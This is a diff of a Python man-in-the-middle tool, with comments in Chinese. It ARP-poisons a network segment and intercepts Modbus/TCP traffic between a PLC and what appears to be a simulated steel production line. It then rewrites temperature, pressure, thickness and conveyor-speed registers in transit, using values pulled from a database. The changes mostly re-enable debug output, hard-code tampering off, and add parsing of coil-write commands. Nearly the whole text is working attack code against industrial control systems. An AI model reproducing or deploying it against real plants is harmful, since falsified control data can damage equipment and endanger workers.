@@ -94,10 +94,11 @@ def read_data_from_db_tgzm(connection):
         result = cursor.fetchone()  # 获取一行数据
         if result:
             iron_water, steel_plate, roller, mold, conveyor_belt1, conveyor_belt2, loag = result
-            #print(f"读取的数据: 铁水={iron_water}, 钢板={steel_plate}, 轧辊={roller}, 模具={mold}, 传送带1={conveyor_belt1}, 传送带2={conveyor_belt2}, loag={loag}")
+            print(
+                f"读取的数据: 铁水={iron_water}, 钢板={steel_plate}, 轧辊={roller}, 模具={mold}, 传送带1={conveyor_belt1}, 传送带2={conveyor_belt2}, loag={loag}")
             return iron_water, steel_plate, roller, mold, conveyor_belt1, conveyor_belt2, loag
         else:
-            #print("没有找到id=1的记录")
+            print("没有找到id=1的记录")
             return None
     except Error as e:
         print(f"查询数据时出错: {e}")
@@ -116,7 +117,7 @@ def insert_data_into_db(connection, temperature, pressure, air_quality):
         cursor.execute(query_insert, (temperature, pressure, air_quality))
 
         connection.commit()  # 提交事务
-        #print(f"成功插入数据: 温度={temperature}, 压力={pressure}, 空气质量={air_quality}")
+        print(f"成功插入数据: 温度={temperature}, 压力={pressure}, 空气质量={air_quality}")
 
     except Error as e:
         print(f"插入数据时出错: {e}")
@@ -134,10 +135,10 @@ def update_data_in_db(connection, temperature, pressure, air_quality):
                            WHERE id = 1"""
         cursor.execute(query, (temperature, pressure, air_quality))
         connection.commit()  # 提交事务
-        #if cursor.rowcount > 0:
-        #    print(f"成功更新数据: 温度={temperature}, 压力={pressure}, 空气质量={air_quality}")
-        #else:
-        #    print("没有找到id=1的记录进行更新")
+        if cursor.rowcount > 0:
+            print(f"成功更新数据: 温度={temperature}, 压力={pressure}, 空气质量={air_quality}")
+        else:
+            print("没有找到id=1的记录进行更新")
     except Error as e:
         print(f"更新数据时出错: {e}")
     finally:
@@ -152,7 +153,7 @@ def insert_data_into_db_tgzm(connection, iron_water, steel_plate, roller, mold, 
                        VALUES (%s, %s, %s, %s, %s, %s)"""
         cursor.execute(query, (iron_water, steel_plate, roller, mold, conveyor_belt1, conveyor_belt2))
         connection.commit()  # 提交事务
-        #print("数据插入成功")
+        print("数据插入成功")
     except Error as e:
         print(f"插入数据时出错: {e}")
     finally:
@@ -227,7 +228,7 @@ def send_arp_poison(target_ip, target_mac, gateway_ip, attacker_mac, iface):
     # 伪造网关到目标设备的 ARP 包
     packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=attacker_mac)
     send(packet, iface=iface, verbose=False)
-    #print(f"[INFO] ARP: {gateway_ip} ({attacker_mac}) -> {target_ip} ({target_mac})")
+    print(f"[INFO] ARP: {gateway_ip} ({attacker_mac}) -> {target_ip} ({target_mac})")
 
 def parse_modbus_data(packet, sport, dport):
     """
@@ -270,19 +271,21 @@ def parse_modbus_data(packet, sport, dport):
 
 
                     b1, b2, b3 = bb1, bb2, bb3
+                    #b2 = 55
                     # 打印寄存器的值
-                    #print(f"wendu（K）: {b1}, yali(MN): {b2}, kongqizhiliang: {b3}")
+                    print(f"wendu（K）: {b1}, yali(MN): {b2}, kongqizhiliang: {b3}")
                     print_data(b1, b2, b3)  # 保存到数据库
                     # 从数据库中获取数据温度，
-                    xb1, xb2, xb3, loag = read_data()
+                    #xb1, xb2, xb3, loag = read_data()
+                    loag = 0
                     if loag == 1:
                         # 可以对压力和温度进行修改，这个数据时设备发向plc的状态
-                        b1, b2, b3 = xb1, xb2, xb3
+                        #b1, b2, b3 = xb1, xb2, xb3
                         xmodbus_data = modbus_data[0:2]
                         xmodbus_data += b1.to_bytes(2, byteorder='big')  # 将 b1 转为 2 字节并加入
                         xmodbus_data += b2.to_bytes(2, byteorder='big')  # 将 b2 转为 2 字节并加入
                         xmodbus_data += b3.to_bytes(2, byteorder='big')  # 将 b3 转为 2 字节并加入
-                        #print(f"篡改数据成功")
+                        print(f"篡改数据成功")
                     else:
                         # 将 modbus_data[0:2], b1, b2, b3 组合到一起
                         xmodbus_data = modbus_data[0:2]  # 保留 modbus_data 的前两字节
@@ -293,7 +296,7 @@ def parse_modbus_data(packet, sport, dport):
                     modbus_tdate = mbap_header  # MBAP header 前 7 字节
                     modbus_tdate += xmodbus_data  # 合并 xmodbus_data 到 modbus_tdate
                     payload = modbus_tdate
-                    #print(f"new modbus_zdata: {binascii.hexlify(modbus_tdate)}")
+                    print(f"new modbus_zdata: {binascii.hexlify(modbus_tdate)}")
 
                 else:
                     return payload
@@ -319,23 +322,25 @@ def parse_modbus_data(packet, sport, dport):
                     a4 = int.from_bytes(register_values[6:8], byteorder='big')  # 模具温度单位为K，向下取整
                     a5 = int.from_bytes(register_values[8:10], byteorder='big')  # 传送带1速度单位为cm/s，可能是向下取整
                     a6 = int.from_bytes(register_values[10:12], byteorder='big')  # 传送带2速度单位为cm/s，可能是向下取整
-                    if a6 > 65000:
-                        a6 = a6 - 65536
+
                     print_data_tgzm(a1, a2, a3, a4, a5, a6)
                     # 输出结果
-                    #print(f"写多个保持寄存器: 起始地址: {register_address}, 寄存器数量: {register_count}, 字节数: {byte_count}, 值: {binascii.hexlify(register_values)}")
-                    #print(f"铁水wendu（K）: {a1}, houdu(m): {a2}, zhiji（mm）: {a3}, mojuwendu（K）: {a4}, 传送带1sudu: {a5}, 传送带2sudu: {a6}")
+                    print(
+                        f"写多个保持寄存器: 起始地址: {register_address}, 寄存器数量: {register_count}, 字节数: {byte_count}, 值: {binascii.hexlify(register_values)}")
+                    print(
+                        f"铁水wendu（K）: {a1}, houdu(m): {a2}, zhiji（mm）: {a3}, mojuwendu（K）: {a4}, 传送带1sudu: {a5}, 传送带2sudu: {a6}")
                     # 这个可以对这6个变量进行修改，是plc控制生产线的初始数据
-                    xa1, xa2, xa3, xa4, xa5, xa6, loag = read_data_tgzm()
+                    #xa1, xa2, xa3, xa4, xa5, xa6, loag = read_data_tgzm()
+                    loag = 0
 
                     if loag == 1:
                         xmodbus_data = modbus_data[0:6]  # 保留 modbus_data 的前两字节
-                        xmodbus_data += xa1.to_bytes(2, byteorder='big')  # 将 a1 转为 2 字节并加入
-                        xmodbus_data += xa2.to_bytes(2, byteorder='big')  # 将 a2 转为 2 字节并加入
-                        xmodbus_data += xa3.to_bytes(2, byteorder='big')  # 将 a3 转为 2 字节并加入
-                        xmodbus_data += xa4.to_bytes(2, byteorder='big')  # 将 a4 转为 2 字节并加入
-                        xmodbus_data += xa5.to_bytes(2, byteorder='big')  # 将 a5 转为 2 字节并加入
-                        xmodbus_data += xa6.to_bytes(2, byteorder='big')  # 将 a6 转为 2 字节并加入
+                        #xmodbus_data += xa1.to_bytes(2, byteorder='big')  # 将 a1 转为 2 字节并加入
+                        #xmodbus_data += xa2.to_bytes(2, byteorder='big')  # 将 a2 转为 2 字节并加入
+                        #xmodbus_data += xa3.to_bytes(2, byteorder='big')  # 将 a3 转为 2 字节并加入
+                        #xmodbus_data += xa4.to_bytes(2, byteorder='big')  # 将 a4 转为 2 字节并加入
+                        #xmodbus_data += xa5.to_bytes(2, byteorder='big')  # 将 a5 转为 2 字节并加入
+                        #xmodbus_data += xa6.to_bytes(2, byteorder='big')  # 将 a6 转为 2 字节并加入
                     else:
                         xmodbus_data = modbus_data[0:6]  # 保留 modbus_data 的前两字节
                         xmodbus_data += a1.to_bytes(2, byteorder='big')  # 将 a1 转为 2 字节并加入
@@ -348,6 +353,17 @@ def parse_modbus_data(packet, sport, dport):
                     modbus_tdate += xmodbus_data  # 合并 xmodbus_data 到 modbus_tdate
                     payload = modbus_tdate
                     #print(f"new modbus_zdata: {binascii.hexlify(modbus_tdate)}")
+                else:
+                    return payload
+            elif function_code == 15:  # 写多个离散输出 (Write Multiple Coils)
+                if sport == 14217 and dport == 11111:
+                    register_address = int.from_bytes(modbus_data[1:3], byteorder='big')
+                    coil_count = int.from_bytes(modbus_data[3:5], byteorder='big')
+                    byte_count = modbus_data[5]  # 数据字节数
+                    coil_values = modbus_data[6:]  # 输出值
+                    print(
+                        f"写多个离散输出: 地址: {register_address}, 输出数量: {coil_count}, 字节数: {byte_count}, 值: {binascii.hexlify(coil_values)}")
+                    # 执行写多个离散输出的操作 (具体逻辑根据需要扩展)
                 else:
                     return payload
             else:
